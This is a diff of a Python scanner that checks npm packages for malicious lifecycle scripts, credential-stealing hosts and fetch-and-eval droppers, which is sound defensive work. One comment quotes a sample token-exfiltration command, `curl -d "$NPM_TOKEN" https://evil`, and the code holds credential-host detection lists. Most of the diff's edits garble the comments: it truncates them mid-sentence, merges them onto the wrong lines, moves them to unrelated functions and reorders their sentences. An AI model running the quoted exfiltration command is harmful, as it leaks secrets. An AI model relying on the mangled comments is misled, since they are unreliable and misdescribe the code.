-# "http://..." is not mistaken for a comment. Strings are NOT blanked
-# (droppers hide payloads there). Fail open on lexer confusion: the raw
-# text is still scanned. JS sibling of scan_packages.py::_strip_noncode.
-# ─────────────────────────────────────────────────────────────────────
+# ───────────────────────────────────────────────────────────────────── Code-only scanning for JS/TS sources.
+# JS sibling of scan_packages.py::_strip_noncode.
 _JS_FAMILY_SUFFIXES = (".js", ".mjs", ".cjs", ".ts", ".tsx", ".jsx")
 
 # Keywords after which a `/` begins a regex literal (not division).
@@ -1302,19 +1203,19 @@ def _slash_is_regex(prev_tok: str) -> bool:
     detection.
     """
     if prev_tok == "":
-        return True  # start of file -> expression position
+        return True
     if prev_tok in _REGEX_PRECEDING_KEYWORDS:
         return True
     last = prev_tok[-1]
     if last.isalnum() or last in "_$)]":
-        return False  # previous token ends a value -> division
-    return True  # operators, punctuation, `{`, `}` -> regex (safe bias)
+        return False  # previous token ends a value -> division operators, punctuation, `{`, `}` -> regex (safe bias)
+    return True
 
 
 def _strip_js_noncode(text: str) -> str:
     """Blank JS/TS comments, preserving byte geometry. Fail-open on confusion."""
     if "//" not in text and "/*" not in text:
-        return text  # nothing to strip
+        return text
     n = len(text)
     out = list(text)
     nl = ("\n", "\r")
@@ -1351,7 +1252,7 @@ def _strip_js_noncode(text: str) -> str:
                             break
                         i += 1
                     if not closed:
-                        return text  # unterminated block comment
+                        return text
                     _blank(start, i)
                     continue
                 if c == "'":
@@ -1402,7 +1303,7 @@ def _strip_js_noncode(text: str) -> str:
                     i += 1
                     continue
                 if c in nl:
-                    return text  # unterminated string literal
+                    return text
                 i += 1
                 continue
             elif state == "tmpl":
@@ -1436,7 +1337,7 @@ def _strip_js_noncode(text: str) -> str:
                     i += 1
                     continue
                 if c in nl:
-                    return text  # unterminated regex literal
+                    return text
                 i += 1
                 continue
             elif state == "regex_cc":
@@ -1454,7 +1355,7 @@ def _strip_js_noncode(text: str) -> str:
             else:
                 return text
         if state != "code" or tmpl_stack:
-            return text  # unterminated construct -> fail open
+            return text
     except Exception:
         return text
     return "".join(out)
@@ -1475,15 +1376,11 @@ def scan_package_json(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
         body = scripts.get(hook)
         if not isinstance(body, str):
             continue
-        # Pin the whole lifecycle body via one digest shared by every lifecycle
-        # finding below: a script that keeps the matched signal but changes
-        # another line (e.g. swapping `echo safe` for `curl -d "$NPM_TOKEN"
-        # https://evil`) must reopen. The stored evidence is a bounded matched
-        # snippet plus this digest, never the entire body, so `--write-baseline`
-        # on a package with a multi-MiB install script does not bloat the baseline
-        # JSON while the digest still binds the full body. Normalized to match
-        # _evidence_hash so a reindent alone does not reopen, while whitespace
-        # inside quoted strings is preserved so a changed quoted payload does.
+        # Pin the whole lifecycle body via one digest shared by every lifecycle finding below: a script that keeps the
+        # matched signal but changes another line (e.g.
+        # swapping `echo safe` for `curl -d "$NPM_TOKEN" https://evil`) must reopen.
+        # The stored evidence is a bounded matched snippet plus this digest, never the entire body, so
+        # `--write-baseline` on a package with a multi-MiB install script does not bloat the baseline JSON while the
         body_digest = hashlib.sha256(
             _canon_preserve_strings(body).encode("utf-8", "replace")
         ).hexdigest()
@@ -1503,8 +1400,7 @@ def scan_package_json(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                     ),
                 )
             )
-        # Cred file paths in a lifecycle script are exfil prep (npm
-        # auto-runs these on `npm ci`); manual scripts are out of scope.
+        # Cred file paths in a lifecycle script are exfil prep (npm auto-runs these on `npm ci`);
         for path_substr, why in CRED_PATH_SUBSTRINGS:
             if path_substr in body:
                 findings.append(
@@ -1541,8 +1437,7 @@ def scan_package_json(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                     ),
                 )
             )
-    # Optional deps pointing at github: are the TanStack-style
-    # injection vector.
+    # Optional deps pointing at github:
     opt = meta.get("optionalDependencies") or {}
     if isinstance(opt, dict):
         for k, v in opt.items():
@@ -1572,7 +1467,6 @@ def _host_in_outbound_context(text: str, host: str) -> bool:
     A bare array literal (defensive blocklist) is safe; co-occurrence
     with an HTTP URL scheme or a fetch verb in a short window is not.
     """
-    # Escape for regex (IPs contain dots).
     host_re = re.escape(host)
     # 1. URL form: http://host or https://host or //host/ or //host"
     url_form = re.compile(
@@ -1580,7 +1474,7 @@ def _host_in_outbound_context(text: str, host: str) -> bool:
     )
     if url_form.search(text):
         return True
-    # 2. host appears within 200 chars of a fetch verb (either side).
+    # host appears within 200 chars of a fetch verb (either side).
     fetch_context = re.compile(
         rf"(?:{_FETCH_VERBS_PAT})[^\n]{{0,200}}{host_re}"
         rf"|{host_re}[^\n]{{0,200}}(?:{_FETCH_VERBS_PAT})",
@@ -1588,7 +1482,7 @@ def _host_in_outbound_context(text: str, host: str) -> bool:
     )
     if fetch_context.search(text):
         return True
-    # 3. `host:` / `hostname:` config field referencing the IP.
+    # `host:` / `hostname:` config field referencing the IP.
     cfg_form = re.compile(
         rf"(?:host|hostname)\s*:\s*['\"`]{host_re}['\"`]",
         re.IGNORECASE,
@@ -1602,6 +1496,7 @@ def _outbound_host_evidence(text: str, host: str) -> str:
     """Evidence capturing the host WITH its outbound context (URL path, fetch
     call, host config), so a changed path/headers/body reopens the key instead
     of riding the bare host literal. Falls back to the host if none matches."""
+    # Escape for regex (IPs contain dots).
     host_re = re.escape(host)
     patterns = (
         re.compile(rf"(?:https?:)?//{host_re}(?:[:/\"'?#][^\n]*)?", re.IGNORECASE),
@@ -1610,21 +1505,14 @@ def _outbound_host_evidence(text: str, host: str) -> str:
             rf"|{host_re}[^\n]{{0,200}}(?:{_FETCH_VERBS_PAT})[^\n]{{0,200}}",
             re.IGNORECASE,
         ),
-        # Host-config form: capture the whole line (path/headers/body), so a
-        # changed outbound payload on the same hostname line reopens the key.
+        # Host-config form: capture the whole line (path/headers/body), so a changed outbound payload on the same
         re.compile(rf"[^\n]*(?:host|hostname)\s*:\s*['\"`]{host_re}['\"`][^\n]*", re.IGNORECASE),
     )
-    # Record EVERY outbound context for the host, not just the first form that
-    # matches: a file that already has a baselined URL for the host and later adds
-    # a separate host-config request (or a second URL) must change the evidence so
     # the new payload cannot inherit the old key. Forms are claimed in order, and a
-    # region already claimed by an earlier form is skipped, so the common
-    # single-context case keeps its existing snippet. Each form is capped at
-    # _MAX_EVIDENCE_MATCHES matches so a host repeated thousands of times in a
     # minified file cannot make the overlap check quadratic; once chosen is full
     # the rest are folded into a digest AS THEY ARRIVE (never accumulated into a
     # list, so a host repeated millions of times cannot OOM the scan) and an added
-    # context still reopens.
+    # Record EVERY outbound context for the host, not just the first form that matches:
     lines, sl_blanked, ml_blanked, nl = _index_text(text)
     claimed: list[tuple[int, int]] = []
     chosen: list[re.Match] = []
@@ -1633,9 +1521,7 @@ def _outbound_host_evidence(text: str, host: str) -> str:
     for pat in patterns:
         for m in pat.finditer(text):
             if len(chosen) < _MAX_EVIDENCE_MATCHES:
-                # Overlap check runs only while filling the display list, so
-                # `claimed` is bounded by the cap and this stays O(cap) per match
-                # (not quadratic), while every later match is still counted below.
+                # Overlap check runs only while filling the display list, so `claimed` is bounded by the cap and this
                 if any(m.start() < e and s < m.end() for s, e in claimed):
                     continue
                 claimed.append((m.start(), m.end()))
@@ -1655,18 +1541,12 @@ def _outbound_host_evidence(text: str, host: str) -> str:
 def scan_text_blob(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
     findings: list[Finding] = []
 
-    # Code-only scanning for JS/TS sources: blank comments before matching so
-    # an IOC host / `eval(atob)` example / campaign marker quoted in a comment
     # cannot manufacture a false positive. Assigned string literals (where real
-    # droppers hide base64 payloads) are preserved. Non-JS text (json/yaml/sh/
-    # py/html) is scanned as-is -- this lexer only understands JS comments.
+    # Code-only scanning for JS/TS sources:
     if rel.lower().endswith(_JS_FAMILY_SUFFIXES):
         text = _strip_js_noncode(text)
 
-    # IOC substrings (literal, case-sensitive). Evidence is the matched-line
-    # context (with its bracket-group continuation), not the bare needle: an IOC
-    # host/hash left in place while the adjacent fetch/exfil body changes must
-    # reopen the key instead of riding the constant.
+    # IOC substrings (literal, case-sensitive).
     for needle, (sev, why) in KNOWN_IOC_STRINGS.items():
         if needle in text:
             findings.append(
@@ -1680,9 +1560,7 @@ def scan_text_blob(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                 )
             )
 
-    # Cred surfaces, tier 1: hosts with no legit use. Bind the outbound context
-    # (path/headers/body) when present so a changed exfil payload on the same call
-    # reopens; falls back to the bare host when it is not in an outbound call.
+    # Cred surfaces, tier 1: hosts with no legit use.
     for needle, why in CRED_HOST_ALWAYS_BAD:
         if needle in text:
             findings.append(
@@ -1700,7 +1578,6 @@ def scan_text_blob(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
             )
 
     # Cred surfaces, tier 2: hosts that appear in defensive code too;
-    # require co-occurrence with a fetch verb or URL prefix.
     for needle, why in CRED_HOST_NEEDS_CONTEXT:
         if needle in text and _host_in_outbound_context(text, needle):
             findings.append(
@@ -1718,10 +1595,9 @@ def scan_text_blob(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                 )
             )
 
-    # Credential PATHS aren't scanned here (too many FPs at file
-    # scope); scan_package_json catches them inside lifecycle scripts.
 
-    # JS-specific regex.
+    # Credential PATHS aren't scanned here (too many FPs at file scope);
+    # scan_package_json catches them inside lifecycle scripts.
     if _JS_FETCH_EVAL.search(text):
         findings.append(
             Finding(
@@ -1762,8 +1638,7 @@ def scan_text_blob(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
     return findings
 
 
-# Filename suffix decides which scanners run; .cjs/.mjs/.ts are
-# treated like .js (attackers use whichever the loader resolves).
+# Filename suffix decides which scanners run;
 _TEXT_SUFFIXES = (
     ".js",
     ".mjs",
@@ -1792,8 +1667,6 @@ def scan_extracted_tree(pkg: PackageEntry, root: Path) -> list[Finding]:
         lower = rel.lower()
         if not lower.endswith(_TEXT_SUFFIXES):
             # Skip native binaries (regex over machine code is noise);
-            # content-magic detection also skips extensionless
-            # executables and versioned shared libraries.
             try:
                 if path.stat().st_size > HARD_MAX_TEXT_FILE_BYTES:
                     continue
@@ -1829,9 +1702,6 @@ def scan_extracted_tree(pkg: PackageEntry, root: Path) -> list[Finding]:
     return findings
 
 
-# ─────────────────────────────────────────────────────────────────────
-# Orchestrator.
-# ─────────────────────────────────────────────────────────────────────
 
 
 def scan_one(pkg: PackageEntry, workspace: Path) -> tuple[list[Finding], str | None]:
@@ -1855,28 +1725,18 @@ def scan_one(pkg: PackageEntry, workspace: Path) -> tuple[list[Finding], str | N
             return [], err
         return scan_extracted_tree(pkg, extract), None
     finally:
-        # Always wipe per-package data to keep the workspace bounded.
         try:
             shutil.rmtree(pkg_dir, ignore_errors = True)
         except Exception:
             pass
 
 
-# ─────────────────────────────────────────────────────────────────────
-# Baseline allowlist: triaged known-good HIGH/CRITICAL findings so the gate
-# can enforce without red-failing on rare legitimate-library behavior.
-# Matched on ``(normalized package, package-relative path, pattern)`` -- not
-# evidence text -- so a version bump does not reopen a finding, but a *new*
-# kind of finding in a listed file is a different pattern and still fails.
-# Mirrors scan_packages.py. Regenerate with ``--write-baseline``.
-# ─────────────────────────────────────────────────────────────────────
+# Baseline allowlist, matched on ``(normalized package, package-relative path, pattern)`` rather than evidence text:
 
 _DEFAULT_BASELINE_PATH = str(Path(__file__).resolve().parent / "scan_npm_packages_baseline.json")
 
-# Bumped when the entry-key semantics change. v3 adds an evidence hash so a new
-# payload under an already-listed package/path/pattern is not auto-suppressed; v2
-# keyed on the package-relative path; v1 stored only a basename. A pre-v3 baseline
-# with entries is ignored (fail closed) rather than mis-applied.
+# v3 adds an evidence hash so a new payload under an already-listed package/path/pattern is not auto-suppressed;
+# Bumped when the entry-key semantics change.
 _BASELINE_SCHEMA_VERSION = 3
 
 
@@ -1944,8 +1804,7 @@ def _load_baseline(path: str) -> set[tuple[str, str, str, str]]:
     if not isinstance(entries, list):
         print(f"  [WARN] baseline {path} entries is not a list", file = sys.stderr)
         return set()
-    # v2 shares v3's package-relative keying, so its entries migrate by recomputing
-    # the evidence hash from their stored evidence; only pre-v2 (basename) is rejected.
+    # v2 shares v3's package-relative keying, so its entries migrate by recomputing the evidence hash from their stored
     if entries and data.get("version") not in (_BASELINE_SCHEMA_VERSION, 2):
         print(
             f"  [WARN] baseline schema v{data.get('version')} predates package-relative "
@@ -1958,6 +1817,7 @@ def _load_baseline(path: str) -> set[tuple[str, str, str, str]]:
     for e in entries:
         if not isinstance(e, dict):
             continue
+        # Always wipe per-package data to keep the workspace bounded.
         try:
             evidence_hash = e.get("evidence_hash") or _evidence_hash(e.get("evidence") or "")
             if not e.get("evidence_hash"):
@@ -2141,7 +2001,6 @@ def main(argv: list[str] | None = None) -> int:
         for f in findings:
             print(str(f), flush = True)
 
-    # Sort by severity then package.
     all_findings.sort(key = lambda f: (_SEVERITY_RANK[f.severity], f.package))
 
     print(
@@ -2164,10 +2023,8 @@ def main(argv: list[str] | None = None) -> int:
     }[args.fail_on]
     threshold_rank = _SEVERITY_RANK[threshold]
 
-    # --write-baseline: persist the full current at/above-threshold set as the
-    # new allowlist (ignoring any loaded baseline), then exit 0. A hard error
-    # means the scan was incomplete, so warn -- a baseline baked from a partial
-    # run would silently allow whatever failed to download.
+    # --write-baseline persists the current at/above-threshold set and exits 0.
+    # write-baseline: persist the full current at/above-threshold set as the new allowlist (ignoring any loaded
     if args.write_baseline:
         if hard_errors:
             print(
@@ -2178,8 +2035,9 @@ def main(argv: list[str] | None = None) -> int:
         _write_baseline(args.write_baseline, all_findings, threshold_rank)
         return 0
 
-    # Baseline allowlist: suppress triaged, known-good findings so the CI gate
-    # can be enforcing without red-failing on legitimate-library noise.
+    # ───────────────────────────────────────────────────────────────────── Baseline allowlist: triaged known-good
+    # HIGH/CRITICAL findings so the gate can enforce without red-failing on rare legitimate-library behavior.
+    # Mirrors scan_packages.py.
     if args.no_baseline:
         baseline_path = None
     elif args.baseline:
@@ -2200,8 +2058,7 @@ def main(argv: list[str] | None = None) -> int:
             flush = True,
         )
 
-    # Exit code: 1 on a hard error, or a NON-baselined finding at/above the
-    # threshold. This is the signal CI gates on once the baseline is clean.
+    # Exit 1 on a hard error or a NON-baselined finding at/above threshold.
     blocking = [f for f in active if _SEVERITY_RANK[f.severity] <= threshold_rank]
     if hard_errors or blocking:
         if blocking:
